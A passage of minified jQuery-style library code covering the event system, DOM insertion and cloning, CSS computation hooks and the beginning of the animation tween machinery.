              l =
                tv[(a = (th.exec(s) || ["", ""])[1].toLowerCase())] ||
                tv._default,
              r.innerHTML = l[1] + x.htmlPrefilter(s) + l[2],
              d = l[0];
            d--;

          )
            r = r.lastChild;
          x.merge(p, r.childNodes), ((r = u.firstChild).textContent = "");
        } else p.push(e.createTextNode(s));
      }
    for (u.textContent = "", f = 0; (s = p[f++]); )
      if (i && x.inArray(s, i) > -1) o && o.push(s);
      else if (
        ((c = to(s)), (r = tm(u.appendChild(s), "script")), c && ty(r), n)
      )
        for (d = 0; (s = r[d++]); ) tg.test(s.type || "") && n.push(s);
    return u;
  }
  var tx = /^([^.]*)(?:\.(.+)|)/;
  function t_() {
    return !0;
  }
  function tw() {
    return !1;
  }
  function tT(t, e) {
    return (
      (t ===
        (function () {
          try {
            return v.activeElement;
          } catch (t) {}
        })()) ==
      ("focus" === e)
    );
  }
  function tS(t, e, n, i, o, s) {
    var r, a;
    if ("object" == _typeof(e)) {
      for (a in ("string" != typeof n && ((i = i || n), (n = void 0)), e))
        tS(t, a, n, i, e[a], s);
      return t;
    }
    if (
      (null == i && null == o
        ? ((o = n), (i = n = void 0))
        : null == o &&
          ("string" == typeof n
            ? ((o = i), (i = void 0))
            : ((o = i), (i = n), (n = void 0))),
      !1 === o)
    )
      o = tw;
    else if (!o) return t;
    return (
      1 === s &&
        ((r = o),
        ((o = function t(e) {
          return x().off(e), r.apply(this, arguments);
        }).guid = r.guid || (r.guid = x.guid++))),
      t.each(function () {
        x.event.add(this, e, o, i, n);
      })
    );
  }
  function tC(t, e, n) {
    n
      ? (G.set(t, e, !1),
        x.event.add(t, e, {
          namespace: !1,
          handler: function t(i) {
            var s,
              r,
              a = G.get(this, e);
            if (1 & i.isTrigger && this[e]) {
              if (a.length)
                (x.event.special[e] || {}).delegateType && i.stopPropagation();
              else if (
                ((a = o.call(arguments)),
                G.set(this, e, a),
                (s = n(this, e)),
                this[e](),
                a !== (r = G.get(this, e)) || s ? G.set(this, e, !1) : (r = {}),
                a !== r)
              )
                return (
                  i.stopImmediatePropagation(), i.preventDefault(), r && r.value
                );
            } else
              a.length &&
                (G.set(this, e, {
                  value: x.event.trigger(
                    x.extend(a[0], x.Event.prototype),
                    a.slice(1),
                    this
                  ),
                }),
                i.stopImmediatePropagation());
          },
        }))
      : void 0 === G.get(t, e) && x.event.add(t, e, t_);
  }
  (x.event = {
    global: {},
    add: function t(e, n, i, o, s) {
      var r,
        a,
        l,
        c,
        d,
        u,
        p,
        f,
        h,
        g,
        v,
        m = G.get(e);
      if (U(e))
        for (
          i.handler && ((i = (r = i).handler), (s = r.selector)),
            s && x.find.matchesSelector(ti, s),
            i.guid || (i.guid = x.guid++),
            (c = m.events) || (c = m.events = Object.create(null)),
            (a = m.handle) ||
              (a = m.handle =
                function (t) {
                  return void 0 !== x && x.event.triggered !== t.type
                    ? x.event.dispatch.apply(e, arguments)
                    : void 0;
                }),
            d = (n = (n || "").match(q) || [""]).length;
          d--;

        )
          (h = v = (l = tx.exec(n[d]) || [])[1]),
            (g = (l[2] || "").split(".").sort()),
            h &&
              ((p = x.event.special[h] || {}),
              (h = (s ? p.delegateType : p.bindType) || h),
              (p = x.event.special[h] || {}),
              (u = x.extend(
                {
                  type: h,
                  origType: v,
                  data: o,
                  handler: i,
                  guid: i.guid,
                  selector: s,
                  needsContext: s && x.expr.match.needsContext.test(s),
                  namespace: g.join("."),
                },
                r
              )),
              (f = c[h]) ||
                (((f = c[h] = []).delegateCount = 0),
                (p.setup && !1 !== p.setup.call(e, o, g, a)) ||
                  (e.addEventListener && e.addEventListener(h, a))),
              p.add &&
                (p.add.call(e, u), u.handler.guid || (u.handler.guid = i.guid)),
              s ? f.splice(f.delegateCount++, 0, u) : f.push(u),
              (x.event.global[h] = !0));
    },
    remove: function t(e, n, i, o, s) {
      var r,
        a,
        l,
        c,
        d,
        u,
        p,
        f,
        h,
        g,
        v,
        m = G.hasData(e) && G.get(e);
      if (m && (c = m.events)) {
        for (d = (n = (n || "").match(q) || [""]).length; d--; )
          if (
            ((h = v = (l = tx.exec(n[d]) || [])[1]),
            (g = (l[2] || "").split(".").sort()),
            h)
          ) {
            for (
              p = x.event.special[h] || {},
                f = c[(h = (o ? p.delegateType : p.bindType) || h)] || [],
                l =
                  l[2] &&
                  RegExp("(^|\\.)" + g.join("\\.(?:.*\\.|)") + "(\\.|$)"),
                a = r = f.length;
              r--;

            )
              (u = f[r]),
                (!s && v !== u.origType) ||
                  (i && i.guid !== u.guid) ||
                  (l && !l.test(u.namespace)) ||
                  (o && o !== u.selector && ("**" !== o || !u.selector)) ||
                  (f.splice(r, 1),
                  u.selector && f.delegateCount--,
                  p.remove && p.remove.call(e, u));
            a &&
              !f.length &&
              ((p.teardown && !1 !== p.teardown.call(e, g, m.handle)) ||
                x.removeEvent(e, h, m.handle),
              delete c[h]);
          } else for (h in c) x.event.remove(e, h + n[d], i, o, !0);
        x.isEmptyObject(c) && G.remove(e, "handle events");
      }
    },
    dispatch: function t(e) {
      var n,
        i,
        o,
        s,
        r,
        a,
        l = Array(arguments.length),
        c = x.event.fix(e),
        d = (G.get(this, "events") || Object.create(null))[c.type] || [],
        u = x.event.special[c.type] || {};
      for (l[0] = c, n = 1; n < arguments.length; n++) l[n] = arguments[n];
      if (
        ((c.delegateTarget = this),
        !u.preDispatch || !1 !== u.preDispatch.call(this, c))
      ) {
        for (
          a = x.event.handlers.call(this, c, d), n = 0;
          (s = a[n++]) && !c.isPropagationStopped();

        )
          for (
            c.currentTarget = s.elem, i = 0;
            (r = s.handlers[i++]) && !c.isImmediatePropagationStopped();

          )
            (c.rnamespace &&
              !1 !== r.namespace &&
              !c.rnamespace.test(r.namespace)) ||
              ((c.handleObj = r),
              (c.data = r.data),
              void 0 !==
                (o = (
                  (x.event.special[r.origType] || {}).handle || r.handler
                ).apply(s.elem, l)) &&
                !1 === (c.result = o) &&
                (c.preventDefault(), c.stopPropagation()));
        return u.postDispatch && u.postDispatch.call(this, c), c.result;
      }
    },
    handlers: function t(e, n) {
      var i,
        o,
        s,
        r,
        a,
        l = [],
        c = n.delegateCount,
        d = e.target;
      if (c && d.nodeType && !("click" === e.type && e.button >= 1)) {
        for (; d !== this; d = d.parentNode || this)
          if (1 === d.nodeType && ("click" !== e.type || !0 !== d.disabled)) {
            for (r = [], a = {}, i = 0; i < c; i++)
              void 0 === a[(s = (o = n[i]).selector + " ")] &&
                (a[s] = o.needsContext
                  ? x(s, this).index(d) > -1
                  : x.find(s, this, null, [d]).length),
                a[s] && r.push(o);
            r.length && l.push({ elem: d, handlers: r });
          }
      }
      return (
        (d = this), c < n.length && l.push({ elem: d, handlers: n.slice(c) }), l
      );
    },
    addProp: function t(e, n) {
      Object.defineProperty(x.Event.prototype, e, {
        enumerable: !0,
        configurable: !0,
        get: h(n)
          ? function () {
              if (this.originalEvent) return n(this.originalEvent);
            }
          : function () {
              if (this.originalEvent) return this.originalEvent[e];
            },
        set: function t(n) {
          Object.defineProperty(this, e, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: n,
          });
        },
      });
    },
    fix: function t(e) {
      return e[x.expando] ? e : new x.Event(e);
    },
    special: {
      load: { noBubble: !0 },
      click: {
        setup: function t(e) {
          var n = this || e;
          return (
            tf.test(n.type) && n.click && k(n, "input") && tC(n, "click", t_),
            !1
          );
        },
        trigger: function t(e) {
          var n = this || e;
          return (
            tf.test(n.type) && n.click && k(n, "input") && tC(n, "click"), !0
          );
        },
        _default: function t(e) {
          var n = e.target;
          return (
            (tf.test(n.type) &&
              n.click &&
              k(n, "input") &&
              G.get(n, "click")) ||
            k(n, "a")
          );
        },
      },
      beforeunload: {
        postDispatch: function t(e) {
          void 0 !== e.result &&
            e.originalEvent &&
            (e.originalEvent.returnValue = e.result);
        },
      },
    },
  }),
    (x.removeEvent = function (t, e, n) {
      t.removeEventListener && t.removeEventListener(e, n);
    }),
    (x.Event = function (t, e) {
      if (!(this instanceof x.Event)) return new x.Event(t, e);
      t && t.type
        ? ((this.originalEvent = t),
          (this.type = t.type),
          (this.isDefaultPrevented =
            t.defaultPrevented ||
            (void 0 === t.defaultPrevented && !1 === t.returnValue)
              ? t_
              : tw),
          (this.target =
            t.target && 3 === t.target.nodeType
              ? t.target.parentNode
              : t.target),
          (this.currentTarget = t.currentTarget),
          (this.relatedTarget = t.relatedTarget))
        : (this.type = t),
        e && x.extend(this, e),
        (this.timeStamp = (t && t.timeStamp) || Date.now()),
        (this[x.expando] = !0);
    }),
    (x.Event.prototype = {
      constructor: x.Event,
      isDefaultPrevented: tw,
      isPropagationStopped: tw,
      isImmediatePropagationStopped: tw,
      isSimulated: !1,
      preventDefault: function t() {
        var e = this.originalEvent;
        (this.isDefaultPrevented = t_),
          e && !this.isSimulated && e.preventDefault();
      },
      stopPropagation: function t() {
        var e = this.originalEvent;
        (this.isPropagationStopped = t_),
          e && !this.isSimulated && e.stopPropagation();
      },
      stopImmediatePropagation: function t() {
        var e = this.originalEvent;
        (this.isImmediatePropagationStopped = t_),
          e && !this.isSimulated && e.stopImmediatePropagation(),
          this.stopPropagation();
      },
    }),
    x.each(
      {
        altKey: !0,
        bubbles: !0,
        cancelable: !0,
        changedTouches: !0,
        ctrlKey: !0,
        detail: !0,
        eventPhase: !0,
        metaKey: !0,
        pageX: !0,
        pageY: !0,
        shiftKey: !0,
        view: !0,
        char: !0,
        code: !0,
        charCode: !0,
        key: !0,
        keyCode: !0,
        button: !0,
        buttons: !0,
        clientX: !0,
        clientY: !0,
        offsetX: !0,
        offsetY: !0,
        pointerId: !0,
        pointerType: !0,
        screenX: !0,
        screenY: !0,
        targetTouches: !0,
        toElement: !0,
        touches: !0,
        which: !0,
      },
      x.event.addProp
    ),
    x.each({ focus: "focusin", blur: "focusout" }, function (t, e) {
      x.event.special[t] = {
        setup: function e() {
          return tC(this, t, tT), !1;
        },
        trigger: function e() {
          return tC(this, t), !0;
        },
        _default: function t() {
          return !0;
        },
        delegateType: e,
      };
    }),
    x.each(
      {
        mouseenter: "mouseover",
        mouseleave: "mouseout",
        pointerenter: "pointerover",
        pointerleave: "pointerout",
      },
      function (t, e) {
        x.event.special[t] = {
          delegateType: e,
          bindType: e,
          handle: function t(n) {
            var i,
              o = n.relatedTarget,
              s = n.handleObj;
            return (
              (o && (o === this || x.contains(this, o))) ||
                ((n.type = s.origType),
                (i = s.handler.apply(this, arguments)),
                (n.type = e)),
              i
            );
          },
        };
      }
    ),
    x.fn.extend({
      on: function t(e, n, i, o) {
        return tS(this, e, n, i, o);
      },
      one: function t(e, n, i, o) {
        return tS(this, e, n, i, o, 1);
      },
      off: function t(e, n, i) {
        var o, s;
        if (e && e.preventDefault && e.handleObj)
          return (
            (o = e.handleObj),
            x(e.delegateTarget).off(
              o.namespace ? o.origType + "." + o.namespace : o.origType,
              o.selector,
              o.handler
            ),
            this
          );
        if ("object" == _typeof(e)) {
          for (s in e) this.off(s, n, e[s]);
          return this;
        }
        return (
          (!1 !== n && "function" != typeof n) || ((i = n), (n = void 0)),
          !1 === i && (i = tw),
          this.each(function () {
            x.event.remove(this, e, i, n);
          })
        );
      },
    });
  var tk = /<script|<style|<link/i,
    t9 = /checked\s*(?:[^=]|=\s*.checked.)/i,
    tA = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;
  function tP(t, e) {
    return (
      (k(t, "table") &&
        k(11 !== e.nodeType ? e : e.firstChild, "tr") &&
        x(t).children("tbody")[0]) ||
      t
    );
  }
  function tE(t) {
    return (t.type = (null !== t.getAttribute("type")) + "/" + t.type), t;
  }
  function t0(t) {
    return (
      "true/" === (t.type || "").slice(0, 5)
        ? (t.type = t.type.slice(5))
        : t.removeAttribute("type"),
      t
    );
  }
  function tL(t, e) {
    var n, i, o, s, r, a;
    if (1 === e.nodeType) {
      if (G.hasData(t) && (a = G.get(t).events))
        for (o in (G.remove(e, "handle events"), a))
          for (n = 0, i = a[o].length; n < i; n++) x.event.add(e, o, a[o][n]);
      K.hasData(t) && ((s = K.access(t)), (r = x.extend({}, s)), K.set(e, r));
    }
  }
  function tD(t, e, n, i) {
    e = s(e);
    var o,
      r,
      a,
      l,
      c,
      d,
      u = 0,
      p = t.length,
      g = p - 1,
      v = e[0],
      m = h(v);
    if (m || (p > 1 && "string" == typeof v && !f.checkClone && t9.test(v)))
      return t.each(function (o) {
        var s = t.eq(o);
        m && (e[0] = v.call(this, o, s.html())), tD(s, e, n, i);
      });
    if (
      p &&
      ((r = (o = tb(e, t[0].ownerDocument, !1, t, i)).firstChild),
      1 === o.childNodes.length && (o = r),
      r || i)
    ) {
      for (l = (a = x.map(tm(o, "script"), tE)).length; u < p; u++)
        (c = o),
          u !== g &&
            ((c = x.clone(c, !0, !0)), l && x.merge(a, tm(c, "script"))),
          n.call(t[u], c, u);
      if (l)
        for (d = a[a.length - 1].ownerDocument, x.map(a, t0), u = 0; u < l; u++)
          (c = a[u]),
            tg.test(c.type || "") &&
              !G.access(c, "globalEval") &&
              x.contains(d, c) &&
              (c.src && "module" !== (c.type || "").toLowerCase()
                ? x._evalUrl &&
                  !c.noModule &&
                  x._evalUrl(
                    c.src,
                    { nonce: c.nonce || c.getAttribute("nonce") },
                    d
                  )
                : y(c.textContent.replace(tA, ""), c, d));
    }
    return t;
  }
  function t1(t, e, n) {
    for (var i, o = e ? x.filter(e, t) : t, s = 0; null != (i = o[s]); s++)
      n || 1 !== i.nodeType || x.cleanData(tm(i)),
        i.parentNode &&
          (n && to(i) && ty(tm(i, "script")), i.parentNode.removeChild(i));
    return t;
  }
  x.extend({
    htmlPrefilter: function t(e) {
      return e;
    },
    clone: function t(e, n, i) {
      var o,
        s,
        r,
        a,
        l,
        c,
        d,
        u = e.cloneNode(!0),
        p = to(e);
      if (
        !(
          f.noCloneChecked ||
          (1 !== e.nodeType && 11 !== e.nodeType) ||
          x.isXMLDoc(e)
        )
      )
        for (a = tm(u), o = 0, s = (r = tm(e)).length; o < s; o++)
          (l = r[o]),
            (c = a[o]),
            (d = void 0),
            "input" === (d = c.nodeName.toLowerCase()) && tf.test(l.type)
              ? (c.checked = l.checked)
              : ("input" !== d && "textarea" !== d) ||
                (c.defaultValue = l.defaultValue);
      if (n) {
        if (i)
          for (r = r || tm(e), a = a || tm(u), o = 0, s = r.length; o < s; o++)
            tL(r[o], a[o]);
        else tL(e, u);
      }
      return (
        (a = tm(u, "script")).length > 0 && ty(a, !p && tm(e, "script")), u
      );
    },
    cleanData: function t(e) {
      for (var n, i, o, s = x.event.special, r = 0; void 0 !== (i = e[r]); r++)
        if (U(i)) {
          if ((n = i[G.expando])) {
            if (n.events)
              for (o in n.events)
                s[o] ? x.event.remove(i, o) : x.removeEvent(i, o, n.handle);
            i[G.expando] = void 0;
          }
          i[K.expando] && (i[K.expando] = void 0);
        }
    },
  }),
    x.fn.extend({
      detach: function t(e) {
        return t1(this, e, !0);
      },
      remove: function t(e) {
        return t1(this, e);
      },
      text: function t(e) {
        return R(
          this,
          function (t) {
            return void 0 === t
              ? x.text(this)
              : this.empty().each(function () {
                  (1 !== this.nodeType &&
                    11 !== this.nodeType &&
                    9 !== this.nodeType) ||
                    (this.textContent = t);
                });
          },
          null,
          e,
          arguments.length
        );
      },
      append: function t() {
        return tD(this, arguments, function (t) {
          (1 !== this.nodeType &&
            11 !== this.nodeType &&
            9 !== this.nodeType) ||
            tP(this, t).appendChild(t);
        });
      },
      prepend: function t() {
        return tD(this, arguments, function (t) {
          if (
            1 === this.nodeType ||
            11 === this.nodeType ||
            9 === this.nodeType
          ) {
            var e = tP(this, t);
            e.insertBefore(t, e.firstChild);
          }
        });
      },
      before: function t() {
        return tD(this, arguments, function (t) {
          this.parentNode && this.parentNode.insertBefore(t, this);
        });
      },
      after: function t() {
        return tD(this, arguments, function (t) {
          this.parentNode && this.parentNode.insertBefore(t, this.nextSibling);
        });
      },
      empty: function t() {
        for (var e, n = 0; null != (e = this[n]); n++)
          1 === e.nodeType && (x.cleanData(tm(e, !1)), (e.textContent = ""));
        return this;
      },
      clone: function t(e, n) {
        return (
          (e = null != e && e),
          (n = null == n ? e : n),
          this.map(function () {
            return x.clone(this, e, n);
          })
        );
      },
      html: function t(e) {
        return R(
          this,
          function (t) {
            var e = this[0] || {},
              n = 0,
              i = this.length;
            if (void 0 === t && 1 === e.nodeType) return e.innerHTML;
            if (
              "string" == typeof t &&
              !tk.test(t) &&
              !tv[(th.exec(t) || ["", ""])[1].toLowerCase()]
            ) {
              t = x.htmlPrefilter(t);
              try {
                for (; n < i; n++)
                  1 === (e = this[n] || {}).nodeType &&
                    (x.cleanData(tm(e, !1)), (e.innerHTML = t));
                e = 0;
              } catch (o) {}
            }
            e && this.empty().append(t);
          },
          null,
          e,
          arguments.length
        );
      },
      replaceWith: function t() {
        var e = [];
        return tD(
          this,
          arguments,
          function (t) {
            var n = this.parentNode;
            0 > x.inArray(this, e) &&
              (x.cleanData(tm(this)), n && n.replaceChild(t, this));
          },
          e
        );
      },
    }),
    x.each(
      {
        appendTo: "append",
        prependTo: "prepend",
        insertBefore: "before",
        insertAfter: "after",
        replaceAll: "replaceWith",
      },
      function (t, e) {
        x.fn[t] = function (t) {
          for (var n, i = [], o = x(t), s = o.length - 1, a = 0; a <= s; a++)
            (n = a === s ? this : this.clone(!0)),
              x(o[a])[e](n),
              r.apply(i, n.get());
          return this.pushStack(i);
        };
      }
    );
  var tj = RegExp("^(" + tt + ")(?!px)[a-z%]+$", "i"),
    t3 = function e(n) {
      var i = n.ownerDocument.defaultView;
      return (i && i.opener) || (i = t), i.getComputedStyle(n);
    },
    tH = function t(e, n, i) {
      var o,
        s,
        r = {};
      for (s in n) (r[s] = e.style[s]), (e.style[s] = n[s]);
      for (s in ((o = i.call(e)), n)) e.style[s] = r[s];
      return o;
    },
    tq = RegExp(tn.join("|"), "i");
  function tO(t, e, n) {
    var i,
      o,
      s,
      r,
      a = t.style;
    return (
      (n = n || t3(t)) &&
        ("" !== (r = n.getPropertyValue(e) || n[e]) ||
          to(t) ||
          (r = x.style(t, e)),
        !f.pixelBoxStyles() &&
          tj.test(r) &&
          tq.test(e) &&
          ((i = a.width),
          (o = a.minWidth),
          (s = a.maxWidth),
          (a.minWidth = a.maxWidth = a.width = r),
          (r = n.width),
          (a.width = i),
          (a.minWidth = o),
          (a.maxWidth = s))),
      void 0 !== r ? r + "" : r
    );
  }
  function tN(t, e) {
    return {
      get: function n() {
        if (!t()) return (this.get = e).apply(this, arguments);
        delete this.get;
      },
    };
  }
  !(function () {
    function e() {
      if (d) {
        (c.style.cssText =
          "position:absolute;left:-11111px;width:60px;margin-top:1px;padding:0;border:0"),
          (d.style.cssText =
            "position:relative;display:block;box-sizing:border-box;overflow:scroll;margin:auto;border:1px;padding:1px;width:60%;top:1%"),
          ti.appendChild(c).appendChild(d);
        var e = t.getComputedStyle(d);
        (i = "1%" !== e.top),
          (l = 12 === n(e.marginLeft)),
          (d.style.right = "60%"),
          (r = 36 === n(e.right)),
          (o = 36 === n(e.width)),
          (d.style.position = "absolute"),
          (s = 12 === n(d.offsetWidth / 3)),
          ti.removeChild(c),
          (d = null);
      }
    }
    function n(t) {
      return Math.round(parseFloat(t));
    }
    var i,
      o,
      s,
      r,
      a,
      l,
      c = v.createElement("div"),
      d = v.createElement("div");
    d.style &&
      ((d.style.backgroundClip = "content-box"),
      (d.cloneNode(!0).style.backgroundClip = ""),
      (f.clearCloneStyle = "content-box" === d.style.backgroundClip),
      x.extend(f, {
        boxSizingReliable: function t() {
          return e(), o;
        },
        pixelBoxStyles: function t() {
          return e(), r;
        },
        pixelPosition: function t() {
          return e(), i;
        },
        reliableMarginLeft: function t() {
          return e(), l;
        },
        scrollboxSize: function t() {
          return e(), s;
        },
        reliableTrDimensions: function e() {
          var n, i, o, s;
          return (
            null == a &&
              ((n = v.createElement("table")),
              (i = v.createElement("tr")),
              (o = v.createElement("div")),
              (n.style.cssText =
                "position:absolute;left:-11111px;border-collapse:separate"),
              (i.style.cssText = "border:1px solid"),
              (i.style.height = "1px"),
              (o.style.height = "9px"),
              (o.style.display = "block"),
              ti.appendChild(n).appendChild(i).appendChild(o),
              (a =
                parseInt((s = t.getComputedStyle(i)).height, 10) +
                  parseInt(s.borderTopWidth, 10) +
                  parseInt(s.borderBottomWidth, 10) ===
                i.offsetHeight),
              ti.removeChild(n)),
            a
          );
        },
      }));
  })();
  var t2 = ["Webkit", "Moz", "ms"],
    tz = v.createElement("div").style,
    tI = {};
  function t8(t) {
    return (
      x.cssProps[t] ||
      tI[t] ||
      (t in tz
        ? t
        : (tI[t] =
            (function (t) {
              for (
                var e = t[0].toUpperCase() + t.slice(1), n = t2.length;
                n--;

              )
                if ((t = t2[n] + e) in tz) return t;
            })(t) || t))
    );
  }
  var tF = /^(none|table(?!-c[ea]).+)/,
    tM = /^--/,
    t4 = { position: "absolute", visibility: "hidden", display: "block" },
    tR = { letterSpacing: "0", fontWeight: "400" };
  function tB(t, e, n) {
    var i = te.exec(e);
    return i ? Math.max(0, i[2] - (n || 0)) + (i[3] || "px") : e;
  }
  function tW(t, e, n, i, o, s) {
    var r = "width" === e ? 1 : 0,
      a = 0,
      l = 0;
    if (n === (i ? "border" : "content")) return 0;
    for (; r < 4; r += 2)
      "margin" === n && (l += x.css(t, n + tn[r], !0, o)),
        i
          ? ("content" === n && (l -= x.css(t, "padding" + tn[r], !0, o)),
            "margin" !== n &&
              (l -= x.css(t, "border" + tn[r] + "Width", !0, o)))
          : ((l += x.css(t, "padding" + tn[r], !0, o)),
            "padding" !== n
              ? (l += x.css(t, "border" + tn[r] + "Width", !0, o))
              : (a += x.css(t, "border" + tn[r] + "Width", !0, o)));
    return (
      !i &&
        s >= 0 &&
        (l +=
          Math.max(
            0,
            Math.ceil(
              t["offset" + e[0].toUpperCase() + e.slice(1)] - s - l - a - 0.5
            )
          ) || 0),
      l
    );
  }
  function t5(t, e, n) {
    var i = t3(t),
      o =
        (!f.boxSizingReliable() || n) &&
        "border-box" === x.css(t, "boxSizing", !1, i),
      s = o,
      r = tO(t, e, i),
      a = "offset" + e[0].toUpperCase() + e.slice(1);
    if (tj.test(r)) {
      if (!n) return r;
      r = "auto";
    }
    return (
      ((!f.boxSizingReliable() && o) ||
        (!f.reliableTrDimensions() && k(t, "tr")) ||
        "auto" === r ||
        (!parseFloat(r) && "inline" === x.css(t, "display", !1, i))) &&
        t.getClientRects().length &&
        ((o = "border-box" === x.css(t, "boxSizing", !1, i)),
        (s = a in t) && (r = t[a])),
      (r = parseFloat(r) || 0) +
        tW(t, e, n || (o ? "border" : "content"), s, i, r) +
        "px"
    );
  }
  function t7(t, e, n, i, o) {
    return new t7.prototype.init(t, e, n, i, o);
  }
  x.extend({
    cssHooks: {
      opacity: {
        get: function t(e, n) {
          if (n) {
            var i = tO(e, "opacity");
            return "" === i ? "1" : i;
          }
        },
      },
    },
    cssNumber: {
      animationIterationCount: !0,
      columnCount: !0,
      fillOpacity: !0,
      flexGrow: !0,
      flexShrink: !0,
      fontWeight: !0,
      gridArea: !0,
      gridColumn: !0,
      gridColumnEnd: !0,
      gridColumnStart: !0,
      gridRow: !0,
      gridRowEnd: !0,
      gridRowStart: !0,
      lineHeight: !0,
      opacity: !0,
      order: !0,
      orphans: !0,
      widows: !0,
      zIndex: !0,
      zoom: !0,
    },
    cssProps: {},
    style: function t(e, n, i, o) {
      if (e && 3 !== e.nodeType && 8 !== e.nodeType && e.style) {
        var s,
          r,
          a,
          l = Y(n),
          c = tM.test(n),
          d = e.style;
        if (
          (c || (n = t8(l)), (a = x.cssHooks[n] || x.cssHooks[l]), void 0 === i)
        )
          return a && "get" in a && void 0 !== (s = a.get(e, !1, o)) ? s : d[n];
        "string" === (r = _typeof(i)) &&
          (s = te.exec(i)) &&
          s[1] &&
          ((i = ta(e, n, s)), (r = "number")),
          null != i &&
            i == i &&
            ("number" !== r ||
              c ||
              (i += (s && s[3]) || (x.cssNumber[l] ? "" : "px")),
            f.clearCloneStyle ||
              "" !== i ||
              0 !== n.indexOf("background") ||
              (d[n] = "inherit"),
            (a && "set" in a && void 0 === (i = a.set(e, i, o))) ||
              (c ? d.setProperty(n, i) : (d[n] = i)));
      }
    },
    css: function t(e, n, i, o) {
      var s,
        r,
        a,
        l = Y(n);
      return (
        tM.test(n) || (n = t8(l)),
        (a = x.cssHooks[n] || x.cssHooks[l]) &&
          "get" in a &&
          (s = a.get(e, !0, i)),
        void 0 === s && (s = tO(e, n, o)),
        "normal" === s && n in tR && (s = tR[n]),
        "" === i || i
          ? ((r = parseFloat(s)), !0 === i || isFinite(r) ? r || 0 : s)
          : s
      );
    },
  }),
    x.each(["height", "width"], function (t, e) {
      x.cssHooks[e] = {
        get: function t(n, i, o) {
          if (i)
            return !tF.test(x.css(n, "display")) ||
              (n.getClientRects().length && n.getBoundingClientRect().width)
              ? t5(n, e, o)
              : tH(n, t4, function () {
                  return t5(n, e, o);
                });
        },
        set: function t(n, i, o) {
          var s,
            r = t3(n),
            a = !f.scrollboxSize() && "absolute" === r.position,
            l = (a || o) && "border-box" === x.css(n, "boxSizing", !1, r),
            c = o ? tW(n, e, o, l, r) : 0;
          return (
            l &&
              a &&
              (c -= Math.ceil(
                n["offset" + e[0].toUpperCase() + e.slice(1)] -
                  parseFloat(r[e]) -
                  tW(n, e, "border", !1, r) -
                  0.5
              )),
            c &&
              (s = te.exec(i)) &&
              "px" !== (s[3] || "px") &&
              ((n.style[e] = i), (i = x.css(n, e))),
            tB(0, i, c)
          );
        },
      };
    }),
    (x.cssHooks.marginLeft = tN(f.reliableMarginLeft, function (t, e) {
      if (e)
        return (
          (parseFloat(tO(t, "marginLeft")) ||
            t.getBoundingClientRect().left -
              tH(t, { marginLeft: 0 }, function () {
                return t.getBoundingClientRect().left;
              })) + "px"
        );
    })),
    x.each({ margin: "", padding: "", border: "Width" }, function (t, e) {
      (x.cssHooks[t + e] = {
        expand: function n(i) {
          for (
            var o = 0, s = {}, r = "string" == typeof i ? i.split(" ") : [i];
            o < 4;
            o++
          )
            s[t + tn[o] + e] = r[o] || r[o - 2] || r[0];
          return s;
        },
      }),
        "margin" !== t && (x.cssHooks[t + e].set = tB);
    }),
    x.fn.extend({
      css: function t(e, n) {
        return R(
          this,
          function (t, e, n) {
            var i,
              o,
              s = {},
              r = 0;
            if (Array.isArray(e)) {
              for (i = t3(t), o = e.length; r < o; r++)
                s[e[r]] = x.css(t, e[r], !1, i);
              return s;
            }
            return void 0 !== n ? x.style(t, e, n) : x.css(t, e);
          },
          e,
          n,
          arguments.length > 1
        );
      },
    }),
    (x.Tween = t7),
    (t7.prototype = {
      constructor: t7,
      init: function t(e, n, i, o, s, r) {
        (this.elem = e),
          (this.prop = i),
          (this.easing = s || x.easing._default),
          (this.options = n),
          (this.start = this.now = this.cur()),
          (this.end = o),
          (this.unit = r || (x.cssNumber[i] ? "" : "px"));
      },
      cur: function t() {
        var e = t7.propHooks[this.prop];
        return e && e.get ? e.get(this) : t7.propHooks._default.get(this);
      },
      run: function t(e) {
        var n,
          i = t7.propHooks[this.prop];
        return (
          this.options.duration
            ? (this.pos = n =
                x.easing[this.easing](
                  e,
                  this.options.duration * e,
                  0,
                  1,
                  this.options.duration
                ))
            : (this.pos = n = e),
          (this.now = (this.end - this.start) * n + this.start),
          this.options.step &&
            this.options.step.call(this.elem, this.now, this),
          i && i.set ? i.set(this) : t7.propHooks._default.set(this),
          this
        );
      },
    }),
    (t7.prototype.init.prototype = t7.prototype),
    (t7.propHooks = {
      _default: {
        get: function t(e) {
          var n;
          return 1 !== e.elem.nodeType ||
            (null != e.elem[e.prop] && null == e.elem.style[e.prop])
            ? e.elem[e.prop]
            : (n = x.css(e.elem, e.prop, "")) && "auto" !== n
            ? n
            : 0;
        },
        set: function t(e) {
          x.fx.step[e.prop]
            ? x.fx.step[e.prop](e)
            : 1 === e.elem.nodeType &&
              (x.cssHooks[e.prop] || null != e.elem.style[t8(e.prop)])
            ? x.style(e.elem, e.prop, e.now + e.unit)
            : (e.elem[e.prop] = e.now);
        },
      },
    }),
    (t7.propHooks.scrollTop = t7.propHooks.scrollLeft =
      {
        set: function t(e) {
          e.elem.nodeType && e.elem.parentNode && (e.elem[e.prop] = e.now);
        },
      }),
    (x.easing = {
      linear: function t(e) {
        return e;
      },
      swing: function t(e) {
        return 0.5 - Math.cos(e * Math.PI) / 2;
      },
      _default: "swing",
    }),
    (x.fx = t7.prototype.init),
    (x.fx.step = {});
  var tX,
    t6,
    tY = /^(?:toggle|show|hide)$/,
    tU = /queueHooks$/;
  function tV() {
    return (
      t.setTimeout(function () {
        tX = void 0;
      }),
      (tX = Date.now())
    );
  }
  function tG(t, e) {
    var n,
      i = 0,
      o = { height: t };
    for (e = e ? 1 : 0; i < 4; i += 2 - e)
      o["margin" + (n = tn[i])] = o["padding" + n] = t;
    return e && (o.opacity = o.width = t), o;
  }
  function tK(t, e, n) {
    for (
      var i,
        o = (tZ.tweeners[e] || []).concat(tZ.tweeners["*"]),
        s = 0,
        r = o.length;
      s < r;
      s++
    )
      if ((i = o[s].call(n, e, t))) return i;
  }
  function tZ(t, e, n) {
    var i,
      o,
      s = 0,
      r = tZ.prefilters.length,
      a = x.Deferred().always(function () {
        delete l.elem;
      }),
      l = function e() {
        if (o) return !1;
        for (
          var n = tX || tV(),
            i = Math.max(0, c.startTime + c.duration - n),
            s = 1 - (i / c.duration || 0),
            r = 0,
            l = c.tweens.length;
          r < l;
          r++
        )
          c.tweens[r].run(s);
        return (
          a.notifyWith(t, [c, s, i]),
          s < 1 && l
            ? i
            : (l || a.notifyWith(t, [c, 1, 0]), a.resolveWith(t, [c]), !1)
        );
      },
      c = a.promise({
        elem: t,
